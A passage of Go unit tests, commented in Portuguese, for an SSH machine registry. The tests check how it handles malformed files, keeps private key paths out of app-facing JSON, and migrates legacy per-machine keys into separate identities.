	if err := os.WriteFile(path, []byte("{isso não é json"), 0o600); err != nil {
		t.Fatal(err)
	}
	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, nil)
	if len(r.List()) != 1 {
		t.Errorf("esperava só a máquina do env: %+v", r.List())
	}
}

// Sem caminho (modo dev / teste) o registro funciona em memória.
func TestRegistroSemCaminhoNaoQuebra(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"}); err != nil {
		t.Errorf("Add sem persistência devia funcionar: %v", err)
	}
}

// A chave privada mora em /data; o caminho dela é detalhe interno do hub e não
// pode ir para o app junto com o resto da máquina.
func TestKeyPathNaoVaiNoJSONDoApp(t *testing.T) {
	b, err := json.Marshal(Machine{Name: "vps", Dest: "vx@host", KeyPath: "/data/machines/keys/vps"})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "keys/vps") {
		t.Errorf("o caminho da chave vazou no JSON: %s", b)
	}
}

// MARK: migração do formato antigo (dest + chave por máquina)

// O caso central da migração: uma máquina gravada no formato de antes do
// redesenho (só "dest", chave no nome dela) ganha uma identidade nova — com o
// nome da própria máquina — que herda o usuário (extraído do dest) e a chave
// que já estava instalada no destino. O Dest resolvido depois bate com o
// original: username da identidade + host extraído do dest antigo.
func TestMigraLegadoConverteFormatoAntigo(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	legado := `[{"name":"vps-antigo","dest":"vanessa@203.0.113.9","port":2222,"key_path":"/data/machines/keys/vps-antigo"}]`
	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
		t.Fatal(err)
	}

	idents := NewIdentityStore()
	r := NewRegistryAt(path, nil, idents)

	m, ok := r.Get("vps-antigo")
	if !ok {
		t.Fatal("a máquina migrada sumiu")
	}
	if m.Identity != "vps-antigo" {
		t.Errorf("a identidade nascida da migração devia ter o nome da máquina, veio %q", m.Identity)
	}
	if m.Host != "203.0.113.9" {
		t.Errorf("host não foi extraído do dest antigo: %q", m.Host)
	}
	if m.Dest != "vanessa@203.0.113.9" {
		t.Errorf("dest derivado depois da migração != dest original: %q", m.Dest)
	}

	id, ok := idents.Get("vps-antigo")
	if !ok {
		t.Fatal("a identidade da migração não foi criada no store")
	}
	if id.Username != "vanessa" {
		t.Errorf("username da identidade migrada errado: %q", id.Username)
	}
	if id.KeyPath != "/data/machines/keys/vps-antigo" {
		t.Errorf("a chave antiga não foi herdada pela identidade: %q", id.KeyPath)
	}
	if m.KeyPath != "/data/machines/keys/vps-antigo" {
		t.Errorf("o key_path resolvido da máquina não bate com o herdado pela identidade: %q", m.KeyPath)
	}
}

// Duas máquinas do MESMO usuário não podem cair na mesma identidade: cada uma
// já tem sua própria chave instalada no authorized_keys remoto, e uni-las
// deixaria uma das duas sem poder entrar (é a razão documentada em migraLegado).
func TestMigraLegadoNaoAgrupaMaquinasDoMesmoUsuario(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	legado := `[
		{"name":"m1","dest":"vx@host1","port":22,"key_path":"/data/machines/keys/m1"},
		{"name":"m2","dest":"vx@host2","port":22,"key_path":"/data/machines/keys/m2"}
	]`
	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
		t.Fatal(err)
	}

	idents := NewIdentityStore()
	r := NewRegistryAt(path, nil, idents)

	m1, ok1 := r.Get("m1")
	m2, ok2 := r.Get("m2")
	if !ok1 || !ok2 {
		t.Fatalf("máquina sumiu: m1 ok=%v m2 ok=%v", ok1, ok2)
	}
	if m1.Identity == m2.Identity {
		t.Errorf("a migração agrupou as duas máquinas na mesma identidade: %q", m1.Identity)
	}
	if m1.KeyPath == "" || m1.KeyPath == m2.KeyPath {
		t.Errorf("as duas identidades acabaram com a mesma chave (ou sem chave): m1=%q m2=%q", m1.KeyPath, m2.KeyPath)
	}
}

// Um dest sem usuário (alias do ~/.ssh/config) não tem o que migrar: fica como
// está, o dest continua servindo, e nenhuma identidade nasce à toa.
func TestMigraLegadoIgnoraDestSemUsuario(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	legado := `[{"name":"apelido-ssh","dest":"meu-alias-do-config","port":22}]`
	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
		t.Fatal(err)
	}

	idents := NewIdentityStore()
	r := NewRegistryAt(path, nil, idents)

	m, ok := r.Get("apelido-ssh")
	if !ok {
		t.Fatal("a máquina sumiu")
	}
	if m.Dest != "meu-alias-do-config" {
		t.Errorf("dest sem usuário devia continuar servindo como está: %q", m.Dest)
	}
	if m.Identity != "" {
		t.Errorf("não devia ter criado identidade sem usuário no dest: %q", m.Identity)
	}
}
